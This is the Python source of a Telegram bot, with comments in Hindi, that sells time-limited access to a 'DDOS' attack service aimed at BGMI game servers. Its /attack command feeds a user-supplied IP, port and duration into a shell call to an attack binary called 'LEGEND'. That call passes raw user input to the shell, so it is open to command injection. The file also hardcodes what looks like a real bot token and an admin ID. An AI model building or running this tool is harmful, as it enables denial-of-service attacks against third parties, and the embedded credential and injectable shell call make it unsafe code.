import asyncio
import time
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# सेटअप लॉगिंग
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

# कॉन्फ़िगरेशन
TELEGRAM_BOT_TOKEN = '7555897511:AAGoAFosRrkVtMq2UnaKg1sKQkRDmIB0lws'
ADMIN_USER_ID = "7129010361"  # अब ये स्ट्रिंग में है ताकि तुलना सही हो
KEYS_FILE = 'keys.txt'

# Keys लोड करने का फ़ंक्शन
def load_keys():
    try:
        with open(KEYS_FILE) as f:
            return {line.split(":")[0]: int(line.split(":")[1]) for line in f}
    except FileNotFoundError:
        return {}

def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        for user, expiry in keys.items():
            f.write(f"{user}:{expiry}\n")

keys = load_keys()
print("✅ 🔑 Keys loaded successfully!")

# /start कमांड
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "🔥 WELCOME TO 💸[Ravi_Op]⚡ DDOS\n"
        "👑 OWNER: @R_SDanger\n"
        "🎯 SERVER: BGMI\n"
        "🚀 USE /attack TO START ATTACK"                  
    )
    print(f"✅ /start used by {chat_id} 🏁")
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# /genkey फिक्स्ड वर्जन
async def genkey(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)  # अब स्ट्रिंग में कन्वर्ट किया

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="🚫 *सिर्फ एडमिन इस कमांड का यूज़ कर सकता है!*", parse_mode='Markdown')
        print(f"❌ Non-admin {user_id} tried to use /genkey 🚷")
        return

    args = context.args
    if not args or len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *यूसेज:* /genkey user_id दिन", parse_mode='Markdown')
        print("⚠️ Incorrect usage of /genkey command ⚙️")
        return

    target_user = str(args[0])
    days = int(args[1])
    expiry_time = int(time.time()) + (days * 86400)

    keys[target_user] = expiry_time
    save_keys(keys)
    print(f"✅ 🔑 Key generated for {target_user} for {days} days")

    await context.bot.send_message(chat_id=chat_id, text=f"✅ *User {target_user} को {days} दिन का एक्सेस मिल गया!* 🎉", parse_mode='Markdown')

# /myinfo कमांड (यूजर अपना स्टेटस चेक कर सके)
async def myinfo(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if user_id not in keys or keys[user_id] < time.time():
        await context.bot.send_message(chat_id=chat_id, text="❌ *तेरा एक्सेस ख़तम हो गया बे! DM कर @R_SDanger*", parse_mode='Markdown')
        print(f"❌ User {user_id} tried to check expired info 🚷")
        return

    remaining_time = keys[user_id] - int(time.time())
    days, hours, minutes = remaining_time // 86400, (remaining_time % 86400) // 3600, (remaining_time % 3600) // 60

    print(f"✅ 📝 User {user_id} checked info: {days} days left")
    await context.bot.send_message(chat_id=chat_id, text=f"📝 *तेरा स्टेटस:* \n⏳ *बचा हुआ टाइम:* {days} दिन, {hours} घंटे, {minutes} मिनट\n🔥 *ओनर:* @R_SDanger", parse_mode='Markdown')

# अटैक प्रोसेस
async def run_attack(chat_id, ip, port, duration, context):
    try:
        print(f"🚀 Starting attack on {ip}:{port} for {duration} seconds 💥")
        process = await asyncio.create_subprocess_shell(
            f"./LEGEND {ip} {port} {duration} 150",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"✅ [stdout]\n{stdout.decode()}")
        if stderr:
            print(f"⚠️ [stderr]\n{stderr.decode()}")

    except Exception as e:
        print(f"⚠️ Error in attack: {str(e)} ❌")
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ *Error:* {str(e)}", parse_mode='Markdown')

    finally:
        print(f"✅ Attack on {ip}:{port} completed 🎯")
        await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Completed Successfully!* 🎯🔥", parse_mode='Markdown')

# /attack कमांड (Unlimited Attack)
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in keys or keys[user_id] < time.time():
        await context.bot.send_message(chat_id=chat_id, text="💀 *तेरा एक्सेस खत्म हो गया बे! DM कर » @R_SDanger*", parse_mode='Markdown')
        print(f"❌ User {user_id} tried to attack without access 🚷")
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="🌟 *यूसेज:* /attack ip port time", parse_mode='Markdown')
        print("⚠️ Incorrect usage of /attack command ⚙️")
        return

    ip, port, time_sec = args
    print(f"✅ 🚀 Attack launched by {user_id} on {ip}:{port} for {time_sec} sec")
    await context.bot.send_message(chat_id=chat_id, text=(
        f"🚀 *𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗*\n"
        f"🎯 *Target:* {ip}\n"
        f"💥 *Port:* {port}\n"
        f"⏳ *Time:* {time_sec} sec\n"
        f"🔥 *Owner:* @R_SDanger"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time_sec, context))

# बॉट शुरू करें
def main():
    print("🚀 Bot is starting... ⚡")
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("attack", attack))
    print("✅ Bot is running... 🎯")
    application.run_polling()

if __name__ == '__main__':
    main()